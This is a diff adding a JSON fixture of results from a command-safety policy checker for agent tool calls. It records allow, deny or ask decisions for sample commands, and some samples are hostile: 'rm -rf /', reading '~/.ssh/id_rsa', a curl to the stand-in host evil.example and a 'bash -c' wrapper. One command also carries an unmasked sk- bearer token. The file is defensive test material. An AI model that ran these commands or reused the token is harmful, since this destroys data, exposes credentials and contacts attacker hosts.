@@ -1,0 +1,193 @@
+[
+  {
+    "decision": "allow",
+    "risk_level": "none",
+    "rule_id": "allow",
+    "evidence": "no denying or ask rule matched",
+    "recommendation": "safe to execute under current policy",
+    "tool_name": "workspace_exec",
+    "command": "go test ./...",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shellsafe.policy",
+    "evidence": "command \"rm\" is denied by denied_commands",
+    "recommendation": "adjust allowed_commands / denied_commands or wrap the use in an auditable workspace script",
+    "tool_name": "workspace_exec",
+    "command": "rm -rf /",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "shellsafe.policy",
+        "decision": "deny",
+        "risk_level": "high",
+        "evidence": "command \"rm\" is denied by denied_commands",
+        "recommendation": "adjust allowed_commands / denied_commands or wrap the use in an auditable workspace script"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "path.denied",
+    "evidence": "denied path marker /.ssh",
+    "recommendation": "do not read or write credential/system paths from tools",
+    "tool_name": "workspace_exec",
+    "command": "cat ~/.ssh/id_rsa",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "path.denied",
+        "decision": "deny",
+        "risk_level": "critical",
+        "evidence": "denied path marker /.ssh",
+        "recommendation": "do not read or write credential/system paths from tools"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "network.denied_host",
+    "evidence": "outbound host evil.example not in allowed_hosts",
+    "recommendation": "add the host to allowed_hosts or remove the network call",
+    "tool_name": "workspace_exec",
+    "command": "curl https://evil.example/x",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "network.denied_host",
+        "decision": "deny",
+        "risk_level": "high",
+        "evidence": "outbound host evil.example not in allowed_hosts",
+        "recommendation": "add the host to allowed_hosts or remove the network call"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "allow",
+    "risk_level": "none",
+    "rule_id": "allow",
+    "evidence": "no denying or ask rule matched",
+    "recommendation": "safe to execute under current policy",
+    "tool_name": "workspace_exec",
+    "command": "curl https://api.github.com/events",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shellsafe.policy",
+    "evidence": "command \"bash\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead.",
+    "recommendation": "adjust allowed_commands / denied_commands or wrap the use in an auditable workspace script",
+    "tool_name": "workspace_exec",
+    "command": "bash -c 'id'",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "shellsafe.policy",
+        "decision": "deny",
+        "risk_level": "high",
+        "evidence": "command \"bash\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead.",
+        "recommendation": "adjust allowed_commands / denied_commands or wrap the use in an auditable workspace script"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "ask",
+    "risk_level": "medium",
+    "rule_id": "ask.dependency_or_mutation",
+    "evidence": "command npm requires human review under ask_commands",
+    "recommendation": "approve only after reviewing package sources and intended mutation",
+    "tool_name": "workspace_exec",
+    "command": "npm install express",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "ask.dependency_or_mutation",
+        "decision": "ask",
+        "risk_level": "medium",
+        "evidence": "command npm requires human review under ask_commands",
+        "recommendation": "approve only after reviewing package sources and intended mutation"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "secret.api_token",
+    "evidence": "credential-like token sk-***REDACTED***",
+    "recommendation": "remove secrets from commands; use env injection outside the model transcript",
+    "tool_name": "workspace_exec",
+    "command": "curl -H 'Authorization: Bearer sk-78c331e8061c42a4883cfee6633447dd' https://api.github.com",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "secret.api_token",
+        "decision": "deny",
+        "risk_level": "critical",
+        "evidence": "credential-like token sk-***REDACTED***",
+        "recommendation": "remove secrets from commands; use env injection outside the model transcript"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "ask",
+    "risk_level": "medium",
+    "rule_id": "hostexec.long_session_risk",
+    "evidence": "hostexec/exec_command can retain PTY sessions and host processes",
+    "recommendation": "require approval for host execution or restrict to workspace_exec",
+    "tool_name": "exec_command",
+    "command": "go test ./...",
+    "backend": "hostexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "hostexec.long_session_risk",
+        "decision": "ask",
+        "risk_level": "medium",
+        "evidence": "hostexec/exec_command can retain PTY sessions and host processes",
+        "recommendation": "require approval for host execution or restrict to workspace_exec"
+      }
+    ],
+    "redacted": false
+  },
+  {
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "secret.credential_field",
+    "evidence": "credential field api_key=***REDACTED***",
+    "recommendation": "strip credentials from tool arguments before execution",
+    "tool_name": "execute_code",
+    "backend": "codeexec",
+    "blocked": true,
+    "findings": [
+      {
+        "rule_id": "secret.credential_field",
+        "decision": "deny",
+        "risk_level": "critical",
+        "evidence": "credential field api_key=***REDACTED***",
+        "recommendation": "strip credentials from tool arguments before execution"
+      }
+    ],
+    "redacted": true
+  }
+]
